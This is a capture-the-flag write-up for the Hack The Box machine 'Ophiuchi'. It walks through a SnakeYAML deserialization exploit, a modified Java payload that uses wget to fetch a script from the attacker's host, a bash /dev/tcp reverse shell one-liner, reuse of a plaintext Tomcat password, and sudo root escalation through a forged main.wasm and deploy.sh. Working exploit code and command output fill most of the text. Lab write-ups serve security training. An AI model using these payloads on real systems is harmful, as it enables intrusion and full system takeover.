# Introduction

[![Ophiuchi](https://www.hackthebox.eu/storage/avatars/82b3289bbabf88da886bc9f45802ac17.png)](https://app.hackthebox.eu/machines/315)

| Point | Description |
| :------:| :------: |
| Name | Ophiuchi  |
| OS   | Linux  |
| Difficulty Rating| Medium   |
| Release | 13 Feb 2021   |
| IP | 10.10.10.227   |
| Owned | 20 Feb 2021 |

# Short retelling

* Find RCE for YAML
* Upload reverse shell
* Find password in logs
* Get User.txt
* Edit .wasm file
* Create new .sh file
* Get reverse shell
* Get Root.txt

# Enumeration

## Nmap

Let's start reconing machine "Ophiuchi" 10.10.10.227 with Nmap

```
└─# nmap -sV -sC -p- 10.10.10.227                                                                                                                                    130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 01:03 EST
Stats: 0:22:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 94.40% done; ETC: 01:26 (0:01:19 remaining)
Nmap scan report for ophiuchi.htb (10.10.10.227)
Host is up (0.31s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)
|   256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)
|_  256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.38
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1508.80 seconds
```
We find 8080/tcp and 22/tcp ports, so lets add *ophiuchi.htb* to /etc/hosts and website http://ophiuchi.htb:8080.

![Ophiuchi](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-23_130611.png)

We see *Online YAML Parser*. 

When we are clicked on button *parse*, we will get redirect to the another page with information about error. 

![Ophiuchi](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-02-23_131153.png)

And I start searching about exploits for *Online YAML Parser*:

* https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858
* https://github.com/mbechler/marshalsec
* https://github.com/artsploit/yaml-payload

# Explotation

Now I hosted a python server on port 8888 on my local machine and tried to use this payload to see if the URL gets a hit from the execution of the payload during parsing

```
┌──(root💀kali)-[~kali/HTB/Ophiuchi]
└─# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
```

And write the payload in the form of *Online YAML Parser*.

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.147:8888/"]
  ]]
]
```

Now that we have the confirmation that the payload actually works.

```
┌──(root💀kali)-[~kali/HTB/Ophiuchi]
└─# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.227 - - [23/Feb/2021 01:20:43] code 404, message File not found
10.10.10.227 - - [23/Feb/2021 01:20:43] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 404 -
```

It tries to access the endpoint “/META-INF/services/javax.script.ScriptEngineFactory” and since its not available, our server responds with a 404 error.
Till now we just have evidence of the exploit code working but we still don’t have a remote code execution on the application hence after further digging I stumbled upon the below [github link](https://github.com/artsploit/yaml-payload).

Dowload this directory to our host

```
┌──(root💀kali)-[~kali/HTB/Ophiuchi]
└─# git clone https://github.com/artsploit/yaml-payload      
Cloning into 'yaml-payload'...
remote: Enumerating objects: 10, done.
remote: Total 10 (delta 0), reused 0 (delta 0), pack-reused 10
Unpacking objects: 100% (10/10), 1.34 KiB | 229.00 KiB/s, done.
```

Edit *AwesomeScriptEngineFactory.java* for rce *reverse shell*

```
┌──(root💀kali)-[~kali/…/Ophiuchi/yaml-payload/src/artsploit]
└─# cat AwesomeScriptEngineFactory.java 
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("wget http://10.10.14.147:8888/pasha.sh -O /tmp/pasha.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```

At first this payload will download our script of reverse shell *pasha.sh*

```
┌──(root💀kali)-[~]
└─# cat pasha.sh 
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.147/5555 0>&1'
```

Let's compile our java payload.

```
┌──(root💀kali)-[~kali/HTB/Ophiuchi/yaml-payload]
└─# javac src/artsploit/AwesomeScriptEngineFactory.java
                                                                                                                                                                           
┌──(root💀kali)-[~kali/HTB/Ophiuchi/yaml-payload]
└─# ls src/artsploit 
AwesomeScriptEngineFactory.class  AwesomeScriptEngineFactory.java
```

```
┌──(root💀kali)-[~kali/HTB/Ophiuchi/yaml-payload]
└─# jar -cvf yaml-payload.jar -C src/ .
added manifest
adding: artsploit/(in = 0) (out= 0)(stored 0%)
adding: artsploit/AwesomeScriptEngineFactory.java(in = 1515) (out= 416)(deflated 72%)
adding: artsploit/AwesomeScriptEngineFactory.class(in = 1642) (out= 690)(deflated 57%)
ignoring entry META-INF/
adding: META-INF/services/(in = 0) (out= 0)(stored 0%)
adding: META-INF/services/javax.script.ScriptEngineFactory(in = 36) (out= 38)(deflated -5%)
                                                                                                                                                                           
┌──(root💀kali)-[~kali/HTB/Ophiuchi/yaml-payload]
└─# ls              
pasha.sh  README.md  src  yaml-payload.jar
```

Start local web-server and run payload

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.14.147:8888/yaml-payload.jar"]
  ]]
]
```
 We can see, that our payload successfully dowload reverse shell script in the folder *tmp*.
 
 ```
 ┌──(root💀kali)-[~kali/HTB/Ophiuchi/yaml-payload]
└─# python3 -m http.server 8888
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.227 - - [23/Feb/2021 02:26:08] "GET /yaml-payload.jar HTTP/1.1" 200 -
10.10.10.227 - - [23/Feb/2021 02:26:08] "GET /yaml-payload.jar HTTP/1.1" 200 -
10.10.10.227 - - [23/Feb/2021 02:26:09] "GET /pasha.sh HTTP/1.1" 200 -
```

Now we should edit our *AwesomeScriptEngineFactory.java* for run script of reverse shell.

Dont'forget remove *AwesomeScriptEngineFactory.class* and *yaml-payload.jar*

```
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("bash /tmp/pasha.sh");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
```

And compile it and run payload again again.

We get reverse shell from user *tomcat*

```
┌──(root💀kali)-[~kali/HTB/Ophiuchi/yaml-payload]
└─# python3 -m http.server 8888                       
Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
10.10.10.227 - - [23/Feb/2021 02:31:43] "GET /yaml-payload.jar HTTP/1.1" 200 -
10.10.10.227 - - [23/Feb/2021 02:31:44] "GET /yaml-payload.jar HTTP/1.1" 200 -
```

```
┌──(root💀kali)-[~]
└─# nc -lvp 5555 
listening on [any] 5555 ...
connect to [10.10.14.147] from ophiuchi.htb [10.10.10.227] 40524
bash: cannot set terminal process group (792): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@ophiuchi:/$ 
```

# Privilege Escalation#1

We need to find way to privilege escalation, so run [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).

Analyzing report and nothing interesting.

Next I decided to check home direcory of *tomcat*

```
tomcat@ophiuchi:/tmp$ cd ~
cd ~
tomcat@ophiuchi:~$ ls
ls
bin           CONTRIBUTING.md  logs       RELEASE-NOTES  webapps
BUILDING.txt  lib              NOTICE     RUNNING.txt    work
conf          LICENSE          README.md  temp
```

There are meny config diles and logs. Try to find some info about user **adminn**.

```
tomcat@ophiuchi:~$ grep -r -i 'passw'

```

We find **password="whythereisalimit"** of **admin** in *conf/tomcat-users.xml*

```
conf/tomcat-users.xml:<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
conf/tomcat-users.xml:  you must define such a user - the username and password are arbitrary. It is
conf/tomcat-users.xml:  them. You will also need to set the passwords to something appropriate.
conf/tomcat-users.xml:  <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
conf/tomcat-users.xml:  <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
conf/tomcat-users.xml:  <user username="role1" password="<must-be-changed>" roles="role1"/>
conf/tomcat-users.xsd:            <xs:attribute name="password" type="xs:string" />
```

And we get **user.txt**

```
tomcat@ophiuchi:~$ su admin
su admin
Password: whythereisalimit

admin@ophiuchi:/opt/tomcat$ cd ~
cd ~
admin@ophiuchi:~$ cat user.txt
cat user.txt
54d50804ffb9b11b2f9772d388a499e8
```

# Privilege Escalation#2

Use ssh connection with our credentials

```
┌──(root💀kali)-[~]
└─# ssh admin@ophiuchi.htb                                                                                                                                             1 ⨯
admin@ophiuchi.htb's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 23 Feb 2021 08:06:18 AM UTC

  System load:             0.0
  Usage of /:              19.9% of 27.43GB
  Memory usage:            17%
  Swap usage:              0%
  Processes:               220
  Users logged in:         1
  IPv4 address for ens160: 10.10.10.227
  IPv6 address for ens160: dead:beef::250:56ff:feb9:fcf0


176 updates can be installed immediately.
56 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Feb 23 07:59:37 2021 from 10.10.14.25
admin@ophiuchi:~$ 
```

We find way to privilege escalation

```
admin@ophiuchi:~$ sudo -l
Matching Defaults entries for admin on ophiuchi:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

We can run */opt/wasm-functions/index.go* . Let's check what it do.

```
admin@ophiuchi:~$ cat /opt/wasm-functions/index.go
package main

import (
        "fmt"
        wasm "github.com/wasmerio/wasmer-go/wasmer"
        "os/exec"
        "log"
)


func main() {
        bytes, _ := wasm.ReadBytes("main.wasm")

        instance, _ := wasm.NewInstance(bytes)
        defer instance.Close()
        init := instance.Exports["info"]
        result,_ := init()
        f := result.String()
        if (f != "1") {
                fmt.Println("Not ready to deploy")
        } else {
                fmt.Println("Ready to deploy")
                out, err := exec.Command("/bin/sh", "deploy.sh").Output()
                if err != nil {
                        log.Fatal(err)
                }
                fmt.Println(string(out))
        }
}
```

[This article](https://habr.com/ru/company/ruvds/blog/454518/) helped me to understand what this script do.

Ok, this is WebAssembly (wasm) code.

```bytes, _ := wasm.ReadBytes("main.wasm")``` - Reading a WebAssembly module

```instance, _ := wasm.NewInstance(bytes)``` - Instantiating the WebAssembly Module 

```init := instance.Exports["info"]``` - Getting the exported `info` function from a WebAssembly instance.

```result,_ := init()``` - Assigning a variable `result` a result of the function `info`

```f := result.String()``` - Сonverting a value to a string format.

If `f != 1` then show *Not ready to deploy*, else run deploy.sh script.

Check content of *deploy.sh*

```
admin@ophiuchi:/opt/wasm-functions$ ls
backup  deploy.sh  index  index.go  main.wasm
admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
#!/bin/bash

# ToDo
# Create script to automatic deploy our new web at tomcat port 8080
```

There isn't any code in it. Checking privilages of files in this directory

```
admin@ophiuchi:/opt/wasm-functions$ ls -lvp
total 3920
drwxr-xr-x 2 root root    4096 Oct 14 19:52 backup/
-rw-r--r-- 1 root root      88 Oct 14 19:49 deploy.sh
-rwxr-xr-x 1 root root 2516736 Oct 14 19:52 index
-rw-rw-r-- 1 root root     522 Oct 14 19:48 index.go
-rwxrwxr-x 1 root root 1479371 Oct 14 19:41 main.wasm
```

And we can't edit them, just execute, so do it

```
admin@ophiuchi:/opt/wasm-functions$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Not ready to deploy
```

This code is working and `f != 1`. What is functions *info* and how to read main.wasm?

I start googling and find this [resource](https://github.com/WebAssembly/wabt)

We need use *wasm2wat* to the inverse of wat2wasm, translate from the binary format back to the text format (also known as a .wat) and *wat2wasm* translate from WebAssembly text format to the WebAssembly binary format.

Let's upload our main.wasm to https://webassembly.github.io/wabt/demo/wasm2wat/

And we can read code:

```
(module
  (type $t0 (func (result i32)))
  (func $info (export "info") (type $t0) (result i32)
    (i32.const 0))
  (table $T0 1 1 funcref)
  (memory $memory (export "memory") 16)
  (global $g0 (mut i32) (i32.const 1048576))
  (global $__data_end (export "__data_end") i32 (i32.const 1048576))
  (global $__heap_base (export "__heap_base") i32 (i32.const 1048576)))
```

I decide to edit ```(i32.const 0)``` to  ```(i32.const 1)``` 

And with https://webassembly.github.io/wabt/demo/wat2wasm/ create new main.wasm.

We could see that the code in *index.go* doesn't check absolute path of main.wasm and the deploy.sh files. So we can manipulate these. These files will be read from our current working directory, from where we run the index.go file.

```
admin@ophiuchi:/tmp$ mkdir pasha
admin@ophiuchi:/tmp$ ls
hsperfdata_tomcat                                                               systemd-private-fe665cc844e14ef8b0e2e2e8be2d85ce-systemd-resolved.service-86lzgf
pasha                                                                           systemd-private-fe665cc844e14ef8b0e2e2e8be2d85ce-systemd-timesyncd.service-4ryC4i
systemd-private-fe665cc844e14ef8b0e2e2e8be2d85ce-systemd-logind.service-QSPlEf  vmware-root_661-4013919860
admin@ophiuchi:/tmp$ cd pasha
admin@ophiuchi:/tmp/pasha$ ls
admin@ophiuchi:/tmp/pasha$ 
```

```
┌──(root💀kali)-[~kali/HTB/Ophiuchi]
└─# scp -r /home/kali/Downloads/main.wasm admin@ophiuchi.htb:/tmp/pasha/                  
admin@ophiuchi.htb's password: 
main.wasm                                                                                                                                100%  190     0.9KB/s   00:00    
```

Also create the deploy.sh

```
admin@ophiuchi:/tmp/pasha$ nano deploy.sh
admin@ophiuchi:/tmp/pasha$ cat deploy.sh 
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.147/5555 0>&1'
admin@ophiuchi:/tmp/pasha$ ls
deploy.sh  main.wasm
```

And run this code

```
admin@ophiuchi:/tmp/pasha$ sudo /usr/bin/go run /opt/wasm-functions/index.go
Ready to deploy
```

And we get reverse shell from **root**. get **root.txt**

```
┌──(root💀kali)-[~kali/HTB/Ophiuchi/yaml-payload]
└─# nc -lvp 5555             
listening on [any] 5555 ...
connect to [10.10.14.147] from ophiuchi.htb [10.10.10.227] 59024
root@ophiuchi:/tmp/pasha# id
id
uid=0(root) gid=0(root) groups=0(root)
root@ophiuchi:/tmp/pasha# cd ~
cd ~
root@ophiuchi:~# ls
ls
go
root.txt
snap
root@ophiuchi:~# cat root.txt 
cat root.txt
12d582c96dc5f746ab6279aba97f4601
```

# Result and Resources

1. https://medium.com/@swapneildash/snakeyaml-deserilization-exploited-b4a2c5ac0858
2. https://github.com/mbechler/marshalsec
3. https://github.com/artsploit/yaml-payload
4. https://habr.com/ru/company/ruvds/blog/454518/
5. https://webassembly.github.io/wabt/demo/wasm2wat/
6. https://webassembly.github.io/wabt/demo/wat2wasm/
